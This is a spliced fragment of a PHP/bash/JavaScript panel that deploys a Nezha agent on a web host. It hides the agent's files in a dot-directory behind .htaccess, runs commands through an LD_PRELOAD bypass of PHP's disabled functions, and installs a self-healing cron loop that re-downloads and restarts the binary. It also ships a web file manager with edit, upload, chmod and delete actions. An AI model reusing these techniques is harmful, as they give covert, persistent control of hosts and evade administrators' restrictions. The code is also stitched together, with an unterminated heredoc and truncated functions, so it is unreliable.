                if ($ip && filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
                    // 2. /proc/net/tcp 的地址是 32位 hex 小端序，需要反转字节
                    $ip_packed = @inet_pton($ip);   // 4 字节大端序
                    if ($ip_packed !== false && strlen($ip_packed) === 4) {
                        $ip_hex_le = bin2hex(strrev($ip_packed));   // 反转 → 小端 hex
                        $port_hex  = sprintf('%04X', $port);
                        $tcp = @file_get_contents('/proc/net/tcp');
                        if ($tcp) {
                            // 3. 严格解析每行，只匹配 rem_address = nezha_IP AND rem_port = nezha_port AND state = 01
                            //    行格式:  sl local_address:port rem_address:port st ...
                            foreach (explode("\n", $tcp) as $line) {
                                if (!preg_match(
                                    '/^\s*\d+:\s+[0-9A-Fa-f]{8}:[0-9A-Fa-f]{4}\s+([0-9A-Fa-f]{8}):([0-9A-Fa-f]{4})\s+(\d+)\s/',
                                    $line, $m2
                                )) continue;
                                if ($m2[1] === strtoupper($ip_hex_le) && $m2[2] === $port_hex && $m2[3] === '01') {
                                    $info['running'] = true;
                                    $info['pids'][] = '(via tcp)';
                                    $info['method'] = 'TCP连接检测';
                                    $info['detail'] = "检测到本机到 $host($ip):$port 的活跃连接 (agent 在跑，但 PHP 权限不足无法获取真实 PID)";
                                    break;
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    return $info;
}

// ================================================================
//  八、停止进程
// ================================================================

function stopProcess($agent, $pidfile) {
    global $EXEC_METHODS, $LD_PRELOAD_AVAILABLE, $BYPASS_SO, $CMDFILE, $RUNSH;
    $killed = [];
    
    // === 收集所有需要杀的 PID ===
    $pids_to_kill = [];
    
    // 1. 从 PID 文件
    if (file_exists($pidfile)) {
        $pid = trim(file_get_contents($pidfile));
        if (is_numeric($pid) && $pid>0) $pids_to_kill[] = $pid;
        @unlink($pidfile);
    }
    
    // 2. 从 /proc 遍历找本 PHP 代码产生的所有进程
    //    匹配: .nezha_agent, run.sh, nezha-agent, 以及 PHP 启动的 shell 子进程
    if (is_dir('/proc') && is_readable('/proc')) {
        // 先收集当前目录下的所有相关进程
        foreach (@scandir('/proc') ?: [] as $pd) {
            if (!is_numeric($pd) || $pd<1) continue;
            $cl = @file_get_contents("/proc/$pd/cmdline");
            if (!$cl) continue;
            $cl_str = str_replace("\0", ' ', $cl);
            // 匹配 agent 本身
            if (strpos($cl, $agent) !== false
                || (strpos($cl, '.nezha_agent') !== false && strpos($cl, dirname($agent)) !== false)
                || (strpos($cl, 'nezha-agent') !== false && strpos($cl, dirname($agent)) !== false)
                || strpos($cl, $RUNSH) !== false) {
                $pids_to_kill[] = $pd;
            }
        }
        // 如果找到了 agent PID，还需要杀它的子进程
        // 用 pstree 找子进程
        if (!empty($pids_to_kill) && !empty($EXEC_METHODS)) {
            foreach (array_unique($pids_to_kill) as $ppid) {
                $chk = runCmd("pstree -p $ppid 2>/dev/null | grep -oP '\\d+' | head -20");
                foreach (array_filter(explode("\n", trim($chk['output']))) as $cpid) {
                    $cpid = trim($cpid);
                    if (is_numeric($cpid) && $cpid > 0) $pids_to_kill[] = $cpid;
                }
            }
        }
    }
    
    // 3. 从 pgrep 补充（匹配 agent 路径和 run.sh）
    if (!empty($EXEC_METHODS)) {
        $chk = runCmd("pgrep -f " . escapeshellarg($agent) . " 2>/dev/null");
        foreach (array_filter(explode("\n", trim($chk['output']))) as $pid) {
            $pid = trim($pid);
            if (is_numeric($pid) && $pid>0) $pids_to_kill[] = $pid;
        }
        $chk2 = runCmd("pgrep -f " . escapeshellarg($RUNSH) . " 2>/dev/null");
        foreach (array_filter(explode("\n", trim($chk2['output']))) as $pid) {
            $pid = trim($pid);
            if (is_numeric($pid) && $pid>0) $pids_to_kill[] = $pid;
        }
    }
    
    $pids_to_kill = array_unique(array_filter($pids_to_kill));
    
    // === 执行杀进程 ===
    foreach ($pids_to_kill as $pid) {
        // 方式1: posix_kill（如果可用且不在禁用列表）
        if (function_exists('posix_kill') && !in_array('posix_kill', array_map('trim', explode(',', @ini_get('disable_functions') ?: '')))) {
            @posix_kill($pid, 9);
            $killed[] = "posix_kill($pid)";
        }
        // 方式2: shell kill（多次确保）
        if (!empty($EXEC_METHODS)) {
            runCmd("kill -9 $pid 2>/dev/null");
            $killed[] = "kill -9 $pid";
        }
        // 方式3: LD_PRELOAD kill
        if ($LD_PRELOAD_AVAILABLE && empty($EXEC_METHODS)) {
            ldPreloadExec("kill -9 $pid", $BYPASS_SO, $CMDFILE);
            $killed[] = "kill $pid (bypass)";
        }
    }
    
    // === 杀整个进程组（关键！nohup/setsid 启动的进程组与父不同） ===
    if (!empty($EXEC_METHODS) && !empty($pids_to_kill)) {
        foreach ($pids_to_kill as $pid) {
            runCmd("kill -9 -\$(ps -o pgid= -p $pid 2>/dev/null | tr -d ' ') 2>/dev/null");
            $killed[] = "killpgid($pid)";
        }
    }
    
    // === 兜底：pkill 精确匹配 agent 路径和 run.sh ===
    if (!empty($EXEC_METHODS)) {
        runCmd("pkill -9 -f " . escapeshellarg($agent) . " 2>/dev/null");
        $killed[] = 'pkill agent';
        runCmd("pkill -9 -f " . escapeshellarg($RUNSH) . " 2>/dev/null");
        $killed[] = 'pkill run.sh';
    }
    // LD_PRELOAD 兜底（v8.5：shell 全禁时唯一杀进程方式）
    if ($LD_PRELOAD_AVAILABLE && empty($EXEC_METHODS) && file_exists($BYPASS_SO) && filesize($BYPASS_SO) > 1000) {
        // 杀 agent
        ldPreloadExec("pkill -9 -f " . escapeshellarg($agent), $BYPASS_SO, $CMDFILE);
        $killed[] = 'pkill agent (bypass)';
        // 杀 run.sh
        ldPreloadExec("pkill -9 -f " . escapeshellarg($RUNSH), $BYPASS_SO, $CMDFILE);
        $killed[] = 'pkill run.sh (bypass)';
        // 杀进程组（每个 PID 都试）
        foreach ($pids_to_kill as $pid) {
            if (!is_numeric($pid) || $pid < 1) continue;
            ldPreloadExec("kill -9 -\$(ps -o pgid= -p $pid 2>/dev/null | tr -d ' ') 2>/dev/null", $BYPASS_SO, $CMDFILE);
            $killed[] = "killpgid($pid) (bypass)";
        }
    }
    
    sleep(1);
    $p = detectProcess($agent, $pidfile);
    return ['ok'=>!$p['running'], 'msg'=>!empty($killed)?implode(', ',$killed):'无可用方式', 'detail'=>$p];
}

// ================================================================

function writeConfig($config, $server, $tls, $secret, $uuid, $uuidfile) {
    if (file_exists($uuidfile)) { $u = trim(@file_get_contents($uuidfile)); if (preg_match('/^[0-9a-fA-F-]{36}$/', $u)) $uuid = $u; }
    if (file_exists($config)) { $old = @file_get_contents($config); if (preg_match('/^uuid:\s*"?([0-9a-fA-F-]{36})"?/m', $old, $m)) { $uuid = $m[1]; @file_put_contents($uuidfile, $uuid); @chmod($uuidfile, 0600); } }
    if (!file_exists($uuidfile)) { @file_put_contents($uuidfile, $uuid); @chmod($uuidfile, 0600); }
    $content = "client_secret: \"{$secret}\"\nserver: \"{$server}\"\ntls: {$tls}\nuuid: \"{$uuid}\"\n";
    return @file_put_contents($config, $content) !== false;
}

function generateRunSh($nz_server, $nz_tls, $nz_secret) {
    $content = <<<'BASH'
#!/bin/bash
# ============================================================
# 哪吒 Agent 自愈启动脚本 v8.5（可独立运行）
# - 支持 start/stop/restart/cron/status/keepalive/log/install/uninstall 动作
# - 配置已嵌入脚本（NZ_SERVER/TLS/SECRET），删 config 也能重建
# - 自愈模式（cron / keepalive）：即使 .stfp/ 内所有文件被删也能恢复
# - 可拷贝到任意目录独立运行（自动定位 .stfp 目录）
#
# 用法：
#   bash run.sh start        启动 agent
#   bash run.sh stop         停止 agent
#   bash run.sh restart      重启
#   bash run.sh status       查看状态
#   bash run.sh cron         单次自愈检查（适合外部 cron 调用）
#   bash run.sh keepalive    进入 4 小时循环保活模式（前台运行，可放 nohup 后台）
#   bash run.sh log          查看最后 30 行日志
#   bash run.sh install      把 cron 条目写入当前用户 crontab（每 4 小时执行 cron）
#   bash run.sh uninstall    从 crontab 移除保活条目
# ============================================================

# ---- 自动定位 .stfp 目录 ----
# 优先级：① 同目录下有 .stfp ② 上层目录有 .stfp（run.sh 在 .stfp 内）
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
if [ -d "$SCRIPT_DIR/.stfp" ]; then
    STFP_DIR="$SCRIPT_DIR/.stfp"
elif [ -d "$(dirname "$SCRIPT_DIR")/.stfp" ]; then
    STFP_DIR="$(dirname "$SCRIPT_DIR")/.stfp"
else
    # 都没有，就在脚本所在目录创建 .stfp
    STFP_DIR="$SCRIPT_DIR/.stfp"
fi
mkdir -p "$STFP_DIR" 2>/dev/null
chmod 755 "$STFP_DIR" 2>/dev/null

AGENT="$STFP_DIR/.nezha_agent"; CONFIG="$STFP_DIR/.nezha_config"; UUIDFILE="$STFP_DIR/.nezha_uuid"; PIDFILE="$STFP_DIR/.nezha_pid"; LOGFILE="$STFP_DIR/.nezha_log"
KA_PIDFILE="$STFP_DIR/.nezha_keepalive_pid"
NZ_SERVER="__NZ_SERVER__"; NZ_TLS="__NZ_TLS__"; NZ_CLIENT_SECRET="__NZ_SECRET__"
NZ_ARCH="$(uname -m)"; [ "$NZ_ARCH" = "aarch64" ] && NZ_ARCH="arm64" || NZ_ARCH="amd64"

log()    { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*" >> "$LOGFILE" 2>/dev/null; }
stdout() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*"; }

get_stable_uuid() {
  [ -f "$UUIDFILE" ] && local u; u=$(cat "$UUIDFILE" 2>/dev/null) && echo "$u" | grep -qE '^[0-9a-fA-F-]{36}$' && NZ_UUID="$u" && return 0
  [ -f "$CONFIG" ] && local u; u=$(grep '^uuid:' "$CONFIG" 2>/dev/null | head -1 | sed 's/^uuid: *"\?\([^"]*\)"\?/\1/') && echo "$u" | grep -qE '^[0-9a-fA-F-]{36}$' && NZ_UUID="$u" && echo "$u" > "$UUIDFILE" && return 0
  local ip; ip=$(curl -s --max-time 5 ifconfig.me 2>/dev/null || echo 127.0.0.1); local h; h=$(echo -n "nezha-$ip" | md5sum | awk '{print $1}')
  NZ_UUID="${h:0:8}-${h:8:4}-4${h:13:3}-${h:16:4}-${h:20:12}"; echo "$NZ_UUID" > "$UUIDFILE"; chmod 600 "$UUIDFILE"
}

write_config() {
  get_stable_uuid
  cat > "$CONFIG" << EOF
client_secret: "${NZ_CLIENT_SECRET}"
server: "${NZ_SERVER}"
tls: ${NZ_TLS}
uuid: "${NZ_UUID}"
EOF
  chmod 600 "$CONFIG"
}

# 【自愈】下载 agent 二进制
download_agent() {
  log "下载 agent (arch=$NZ_ARCH)..."
  local urls=(
    "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${NZ_ARCH}.zip"
    "https://ghgo.xyz/https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${NZ_ARCH}.zip"
    "https://mirror.ghproxy.com/https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${NZ_ARCH}.zip"
  )
  local zip="$STFP_DIR/.nezha_download.zip"
  for url in "${urls[@]}"; do
    curl -sSL "$url" -o "$zip" --connect-timeout 15 --max-time 120 2>/dev/null
    if [ -s "$zip" ] && [ "$(stat -c%s "$zip" 2>/dev/null || stat -f%z "$zip" 2>/dev/null || echo 0)" -gt 100000 ]; then
      (cd "$STFP_DIR" && unzip -o "$zip" >/dev/null 2>&1)
      [ -f "$STFP_DIR/nezha-agent" ] && mv "$STFP_DIR/nezha-agent" "$AGENT"
      rm -f "$zip"
      if [ -f "$AGENT" ]; then chmod 700 "$AGENT"; log "下载成功"; return 0; fi
    fi
    rm -f "$zip"
  done
  log "下载失败"; return 1
}

check_running() {
  IS_RUNNING=""
  [ -f "$PIDFILE" ] && local pid; pid=$(cat "$PIDFILE" 2>/dev/null) && [ -d "/proc/$pid" ] && IS_RUNNING="$pid" && return 0
  IS_RUNNING=$(pgrep -f "$AGENT" 2>/dev/null | head -1)
  [ -n "$IS_RUNNING" ]
}

start_nezha() {
  check_running && log "已运行 PID: $IS_RUNNING" && return 0
  [ ! -f "$AGENT" ] && download_agent
  [ ! -f "$AGENT" ] && log "agent 不存在，无法启动" && return 1
  [ ! -f "$CONFIG" ] && write_config
  log "启动..."; local ok=0
  command -v setsid >/dev/null 2>&1 && { setsid env GOMAXPROCS=1 GOMEMLIMIT=128MiB GODEBUG=asyncpreemptoff=1 GOGC=200 "$AGENT" -c "$CONFIG" >> "$LOGFILE" 2>&1 & sleep 2; check_running && ok=1; }
  [ "$ok" -eq 0 ] && command -v nohup >/dev/null 2>&1 && { nohup env GOMAXPROCS=1 GOMEMLIMIT=128MiB GODEBUG=asyncpreemptoff=1 GOGC=200 "$AGENT" -c "$CONFIG" >> "$LOGFILE" 2>&1 & sleep 2; check_running && ok=1; }
  [ "$ok" -eq 0 ] && { GOMAXPROCS=1 GOMEMLIMIT=128MiB GODEBUG=asyncpreemptoff=1 GOGC=200 "$AGENT" -c "$CONFIG" >> "$LOGFILE" 2>&1 & sleep 2; check_running && ok=1; }
  [ "$ok" -eq 1 ] && echo "$IS_RUNNING" > "$PIDFILE" && log "成功 PID: $IS_RUNNING" && return 0; log "失败"; return 1
}

do_stop() {
  [ -f "$PIDFILE" ] && kill -9 "$(cat "$PIDFILE")" 2>/dev/null && rm -f "$PIDFILE"
  pkill -9 -f "$AGENT" 2>/dev/null
  # 同时停止 keepalive 循环
  if [ -f "$KA_PIDFILE" ]; then
    local kpid; kpid=$(cat "$KA_PIDFILE" 2>/dev/null)
    [ -n "$kpid" ] && kill -9 "$kpid" 2>/dev/null
    rm -f "$KA_PIDFILE"
  fi
  sleep 1
}

# 【自愈】cron 模式入口 — 即使所有文件被删也能恢复
self_heal() {
  log "=== 自愈检查开始 ==="
  [ ! -d "$STFP_DIR" ] && mkdir -p "$STFP_DIR" && chmod 755 "$STFP_DIR"
  get_stable_uuid
  [ ! -f "$CONFIG" ] && write_config
  [ ! -f "$AGENT" ] && download_agent
  if check_running; then
    log "进程存活 PID: $IS_RUNNING"
  else
    log "进程未运行，尝试启动..."
    start_nezha
  fi
  log "=== 自愈检查结束 ==="
}

# 【前台循环保活】每 4 小时执行一次 self_heal
keepalive_loop() {
  stdout "进入 4 小时循环保活模式（前台运行，按 Ctrl+C 退出）"
  stdout "PID: $$，PID 文件: $KA_PIDFILE"
  echo "$$" > "$KA_PIDFILE"
  while true; do
    self_heal
    stdout "下次检查: 4 小时后 ($(date -d '+4 hours' '+%Y-%m-%d %H:%M:%S' 2>/dev/null || date -v+4H '+%Y-%m-%d %H:%M:%S' 2>/dev/null))"
    # 分段 sleep 5 秒一次，方便响应 kill 信号
    for i in $(seq 1 2880); do
      [ -f "$KA_PIDFILE" ] || { stdout "PID 文件被删，退出循环"; exit 0; }
      sleep 5
    done
  done
}

# 【安装到 crontab】每 4 小时执行一次 cron
install_crontab() {
  local entry="0 */4 * * * bash $(readlink -f "$0" 2>/dev/null || echo "$0") cron >> $LOGFILE 2>&1 #nezha-keepalive"
  local existing
  existing=$(crontab -l 2>/dev/null || true)
  # 移除旧的 nezha 保活条目
  local filtered
  filtered=$(echo "$existing" | grep -v -E '(nezha|\.stfp/run\.sh|#nezha-keepalive)' || true)
  # 加上新条目
  (echo "$filtered"; echo "$entry") | crontab - 2>&1
  if [ $? -eq 0 ]; then
    stdout "已安装 crontab 条目："
    stdout "  $entry"
    stdout "查看: crontab -l"
  else
    stdout "❌ crontab 安装失败，请手动添加："
    stdout "  $entry"
    return 1
  fi
}

# 【从 crontab 移除】
uninstall_crontab() {
  local existing
  existing=$(crontab -l 2>/dev/null || true)
  local filtered
  filtered=$(echo "$existing" | grep -v -E '(nezha|\.stfp/run\.sh|#nezha-keepalive)' || true)
  if [ -z "$filtered" ]; then
    crontab -r 2>/dev/null
    stdout "已清空 crontab"
  else
    echo "$filtered" | crontab - 2>&1
    stdout "已从 crontab 移除 nezha 保活条目"
  fi
}

// 【v8.7 新增】ensureInitFiles() - 确保所有必需文件已就位
// 不管用户从哪个按钮开始操作（下载/启动/重启），都先调用这个函数
// 避免出现"只点下载和启动按钮，但 .htaccess/run.sh 没生成"的问题
function ensureInitFiles() {
    global $CONFIG, $RUNSH, $HTACCESS, $NZ_SERVER, $NZ_TLS, $NZ_SECRET, $NZ_UUID, $UUIDFILE;
    $created = [];

    // 1. 配置文件（必须，agent 启动需要）
    if (!file_exists($CONFIG)) {
        writeConfig($CONFIG, $NZ_SERVER, $NZ_TLS, $NZ_SECRET, $NZ_UUID, $UUIDFILE);
        $created[] = 'config';
    }

    // 2. run.sh（必须，保活和 cron 依赖它）
    if (!file_exists($RUNSH)) {
        $c = generateRunSh($NZ_SERVER, $NZ_TLS, $NZ_SECRET);
        @file_put_contents($RUNSH, $c); @chmod($RUNSH, 0755);
        $created[] = 'run.sh';
    }

    // 3. .htaccess（安全相关，禁止外部访问 .stfp 目录）
    if (!file_exists($HTACCESS)) {
        $hta = "<IfModule mod_rewrite.c>\n    RewriteEngine On\n    RewriteRule \"^\\.stfp/\" - [F,L]\n</IfModule>\n<FilesMatch \"^\\.nezha_\">\n    Order allow,deny\n    Deny from all\n</FilesMatch>\n<Files \"run.sh\">\n    Order allow,deny\n    Deny from all\n</Files>\n<Files \"nezha_bypass.so\">\n    Order allow,deny\n    Deny from all\n</Files>\n";
        @file_put_contents($HTACCESS, $hta);
        $created[] = '.htaccess';
    }

    return $created;
}

let fmCurrentPath = '';   // 相对 SCRIPT_DIR 的路径

function fmOpen() {

    setTimeout(() => {
        overlay.classList.remove('open','closing');

function fmRefresh() { fmLoadDir(fmCurrentPath); }

async function fmLoadDir(path) {
    fmCurrentPath = path;
    document.getElementById('fmBody').innerHTML = '<tr><td colspan="5" class="fm-empty">加载中...</td></tr>';
    try {
        const url = '?action=fm_list&path=' + encodeURIComponent(path) + '&_t=' + Date.now();
        const res = await fetch(url, { credentials: 'same-origin' });
        const data = await res.json();
        if (!data.ok) throw new Error(data.error || '加载失败');
        fmRenderCrumbs(data.path);
        fmRenderItems(data.items || []);
    } catch (err) {
        document.getElementById('fmBody').innerHTML = '<tr><td colspan="5" class="fm-empty" style="color:#fca5a5">❌ ' + err.message + '</td></tr>';
    }
}

function fmRenderCrumbs(path) {
    const crumbs = document.getElementById('fmCrumbs');
    let html = '<span class="fm-crumb" onclick="fmLoadDir(\'\')">🏠 根目录</span>';
    if (path) {
        const parts = path.split('/');
        let cur = '';
        parts.forEach((p, i) => {
            cur = cur ? cur + '/' + p : p;
            const isLast = (i === parts.length - 1);
            html += '<span class="fm-crumb-sep">/</span>';
            if (isLast) {
                html += '<span class="fm-crumb-current">' + escapeHtml(p) + '</span>';
            } else {
                html += '<span class="fm-crumb" onclick="fmLoadDir(\'' + escapeAttr(cur) + '\')">' + escapeHtml(p) + '</span>';
            }
        });
    }
    crumbs.innerHTML = html;
}

function fmRenderItems(items) {
    const body = document.getElementById('fmBody');
    if (items.length === 0) {
        body.innerHTML = '<tr><td colspan="5" class="fm-empty">空目录</td></tr>';
        return;
    }
    let html = '';
    items.forEach(item => {
        const icon = item.is_dir ? '📁' : getFileIcon(item.name);
        const sizeStr = item.is_dir ? '-' : formatSize(item.size);
        const timeStr = item.mtime ? new Date(item.mtime * 1000).toLocaleString('zh-CN', { hour12: false }) : '-';
        const path = (fmCurrentPath ? fmCurrentPath + '/' : '') + item.name;
        const escapedName = escapeHtml(item.name);
        const escapedPath = escapeAttr(path);
        let ops = '';
        if (item.is_dir) {
            ops += '<button class="fm-btn fm-btn-b" onclick="fmLoadDir(\'' + escapedPath + '\')">进入</button>';
            ops += '<button class="fm-btn fm-btn-y" onclick="fmChmodPrompt(\'' + escapedPath + '\', \'' + item.perm + '\')">权限</button>';
            ops += '<button class="fm-btn fm-btn-gr" onclick="fmRenamePrompt(\'' + escapedPath + '\', \'' + escapedName + '\')">改名</button>';
            ops += '<button class="fm-btn fm-btn-r" onclick="fmDelete(\'' + escapedPath + '\', true)">删除</button>';
        } else {
            if (!item.is_self && !item.is_htaccess && item.readable && item.size < 5 * 1024 * 1024) {
                ops += '<button class="fm-btn fm-btn-g" onclick="fmEdit(\'' + escapedPath + '\')">编辑</button>';
            } else if (item.is_self) {
                ops += '<span style="color:#64748b;font-size:10px">面板自身</span>';
            } else if (item.is_htaccess) {
                ops += '<span style="color:#64748b;font-size:10px">受保护</span>';
            } else if (item.size >= 5 * 1024 * 1024) {
                ops += '<span style="color:#64748b;font-size:10px">太大</span>';
            } else {
                ops += '<span style="color:#64748b;font-size:10px">不可读</span>';
            }
            ops += '<button class="fm-btn fm-btn-y" onclick="fmChmodPrompt(\'' + escapedPath + '\', \'' + item.perm + '\')">权限</button>';
            ops += '<button class="fm-btn fm-btn-gr" onclick="fmRenamePrompt(\'' + escapedPath + '\', \'' + escapedName + '\')">改名</button>';
            if (!item.is_self && !item.is_htaccess) {
                ops += '<button class="fm-btn fm-btn-r" onclick="fmDelete(\'' + escapedPath + '\', false)">删除</button>';
            }
        }
        const nameClick = item.is_dir ? ' onclick="fmLoadDir(\'' + escapedPath + '\')"' : ' onclick="fmEdit(\'' + escapedPath + '\')"';
        html += '<tr>'
              + '<td><div class="fm-name"' + nameClick + '><span class="fm-icon">' + icon + '</span>' + escapedName + (item.is_self ? ' <span style="color:#ec4899;font-size:9px">(面板)</span>' : '') + '</div></td>'
              + '<td class="fm-size">' + sizeStr + '</td>'
              + '<td class="fm-perm">' + item.perm + '</td>'
              + '<td class="fm-time">' + timeStr + '</td>'
              + '<td class="fm-ops">' + ops + '</td>'
              + '</tr>';
    });
    body.innerHTML = html;
}

function getFileIcon(name) {
    const ext = (name.split('.').pop() || '').toLowerCase();
    if (['php','phtml','php3','php5'].indexOf(ext) !== -1) return '🐘';
    if (['js'].indexOf(ext) !== -1) return '📜';
    if (['html','htm'].indexOf(ext) !== -1) return '🌐';
    if (['css'].indexOf(ext) !== -1) return '🎨';
    if (['sh','bash'].indexOf(ext) !== -1) return '⚙️';
    if (['zip','gz','tar','bz2','xz'].indexOf(ext) !== -1) return '📦';
    if (['txt','md','log','ini','conf','yaml','yml','json'].indexOf(ext) !== -1) return '📄';
    if (['so','dll'].indexOf(ext) !== -1) return '🔌';
    if (['png','jpg','jpeg','gif','svg','webp'].indexOf(ext) !== -1) return '🖼️';
    return '📄';
}

function formatSize(b) {
    if (b < 1024) return b + ' B';
    if (b < 1024 * 1024) return (b / 1024).toFixed(1) + ' KB';
    return (b / 1024 / 1024).toFixed(2) + ' MB';
}

let _editorCurrentPath = '';
async function fmEdit(path) {
    showLoading('读取文件...', '文件: ' + path);
    try {
        const res = await fetch('?action=fm_read&path=' + encodeURIComponent(path), { credentials: 'same-origin', signal: _loadingAbort.signal });
        const data = await res.json();
        hideLoading();
        if (!data.ok) { showToast(data.error || '读取失败', 'error'); return; }
        _editorCurrentPath = path;

        document.getElementById('editorModal').style.display = 'flex';

        hideLoading();
        if (err.name !== 'AbortError') showToast('读取失败: ' + err.message, 'error');
    }
}
function fmEditorClose() {
    document.getElementById('editorModal').style.display = 'none';
    document.getElementById('editorContent').value = '';
    _editorCurrentPath = '';
}
async function fmEditorSave() {
    if (!_editorCurrentPath) return;
    const content = document.getElementById('editorContent').value;
    showLoading('保存文件...', '路径: ' + _editorCurrentPath);
    try {
        const fd = new FormData();
        fd.append('path', _editorCurrentPath);
        fd.append('content', content);
        const res = await fetch('?action=fm_save', { method:'POST', body: fd, credentials: 'same-origin', signal: _loadingAbort.signal });
        const data = await res.json();
        hideLoading();
        if (!data.ok) { showToast(data.error || '保存失败', 'error'); return; }
        showToast('✅ 保存成功', 'success');
        fmEditorClose();
        fmRefresh();
    } catch (err) {
        hideLoading();
        if (err.name !== 'AbortError') showToast('保存失败: ' + err.message, 'error');
    }
}

async function fmUploadSubmit() {
    const input = document.getElementById('uploadFiles');
    if (!input.files || input.files.length === 0) {
        showToast('请选择文件', 'warning');
        return;
    }
    const fd = new FormData();
    for (let i = 0; i < input.files.length; i++) {
        fd.append('files[]', input.files[i]);
    }
    showLoading('上传中...', '共 ' + input.files.length + ' 个文件，目标: ' + (fmCurrentPath || '(根目录)'));
    try {
        const res = await fetch('?action=fm_upload&path=' + encodeURIComponent(fmCurrentPath), {
            method: 'POST', body: fd, credentials: 'same-origin', signal: _loadingAbort.signal
        });
        const data = await res.json();
        hideLoading();
        if (data.ok) {
            showToast('✅ 上传 ' + (data.uploaded || []).length + ' 个文件' + ((data.errors||[]).length ? '，' + data.errors.length + ' 个失败' : ''), 'success');
        } else {
            showToast('上传失败: ' + (data.error || '未知错误'), 'error');
        }
        fmUploadClose();
        fmRefresh();
    } catch (err) {
        hideLoading();
        if (err.name !== 'AbortError') showToast('上传失败: ' + err.message, 'error');
    }
}

// ---------- 工具 ----------
function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}
function escapeAttr(s) {
    return String(s).replace(/['"\\]/g, c => '\\' + c);
}
